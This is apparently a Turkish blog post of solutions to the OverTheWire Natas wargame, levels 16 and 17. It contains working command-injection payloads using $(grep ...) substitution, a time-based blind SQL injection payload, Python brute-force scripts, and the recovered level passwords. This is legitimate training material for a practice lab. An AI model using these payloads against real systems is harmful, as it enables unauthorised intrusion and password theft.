---
layout: post
title: "OverTheWire:Natas Solutions 16-"
date: 2018-06-28
excerpt: "28 Jun 2018"
comments: false
---
#### Level 16

For security reasons, we now filter even more on certain characters.


<figure>
<img src="/assets/img/natas/level165.png">
</figure>

Level 10'a çok benzemekle birlikte, extra olarak; istemciden alınan değer çift tırnaklar içerisinde passhtru fonksiyonunun içerisine yerleştirilmiş.Yani Level 10'daki gibi `a /etc/natas_webpass/natas11 #` bir payload girmem durumunda,

grep -i "a /etc/natas_webpass/natas11 #" dictionary.txt şeklinde bir komut çalışacak ve dictionary.txt dosyasında bu payloadın geçtiği satırları getiricek. Dolayısıyla çıktı vermeyecek.  

Bu durumu bypass edebilmek için "command substition"  denilen şeyi yapacağız.

``` 
Command Substition

  Bir komutun çıktısını, bir değişkende saklama veya başka bir komut içinde kullanma manasına gelir.Basit bir örnekle;
  
  cur_dir=$(pwd)
  echo $cur_dir
  
  Bunu yapabilmenin iki yolu var.
  Backtick karakter " ` " veya $() kullanmak.
  
```
Burada backtick karakteri filtrelenmiş olduğu için ikinci yolu kullanacağız.

Payload olarak $(cat /etc/natas_webpass/natas17) girdiğimizde bu komutun çıktısı passthru fonksiyonun içerisine yerleştirilecek, daha sonrasında dictionary.txt dosyasında bu satır aranacak. Dolayısıyla  böyle bir kullanımdan ziyade passhtru içerisindeki grep komutunu manipüle etmemiz, true-false mantığıyla veriyi inşaa etmemiz gerekiyor. 

"Hacker" kelimesi ile arama yaptığımızda  çıktı bu şekilde.
<figure>
<img src="/assets/img/natas/natas162.png">
</figure>

"Hacker$(grep ^a /etc/natas_webpass/natas17)"  şeklinde bir input girdiğimde çıktı yine aynı.

```
"grep ^a /etc/natas_webpass/natas17" ifadesi /etc/natas_webpass/natas17 dosyasından a harfi ile başlayan satırları getir anlamına geliyor.
```

Demek ki parola a harfi ile başlamıyor, yani grep ^a /etc/natas_webpass/natas17 komutunun çıktısı yok. Eğer ki a harfi ile başlasaydı bu komutun çıktısı natas17'ye ait parola olacaktı.Dolayısıyla ;

grep -i " " dictionary.txt ifadesinde çift tırnaklar arasına natas17'e ait parola gelicekti ve dictionary.txt dosyasında böyle bir satır olmadığı için çıktı boş olucaktı.

Parolanın 32 karakter uzunluğunda olduğunu bir önceki seviyelerden biliyoruz.Bununla birlikte parola küçük harf, büyük harf ve rakam içeriyor. Manuel bir test yapılamayacağından , otomatize eden bir script yazıyoruz.

{% highlight python %}
import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
        for char in chars:
                s=requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=hacker$(grep ^'+passwd+char+' /etc/natas_webpass/natas17)',auth=auth)
                if "hacker" not in s.text:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

#### Level 17

Level 15'in devamı niteliğinde.

<figure>
<img src="/assets/img/natas/natas171.png">
</figure>

Çıktı veren kısımlar yorum satırı haline getirilmiş. Time Based SQL Injection ile parolayı elde etmeyi deniyoruz.

natas18 " and password LIKE BINARY "a%" and sleep(5) şeklinde bir payload girdiğimde natas18 kullanıcısına ait parolanın a ile başlaması halinde 3 saniyelik bir bekleme olucak.

Benzer bir script çalıştırıyoruz.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
       for char in chars:
               payload = {'username' : 'natas18" and password LIKE BINARY "' +passwd + char + '%" and sleep(3) \x23'}
               s=requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload,auth=auth)
               time=s.elapsed.total_seconds()
               if time>1:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#### Level 18
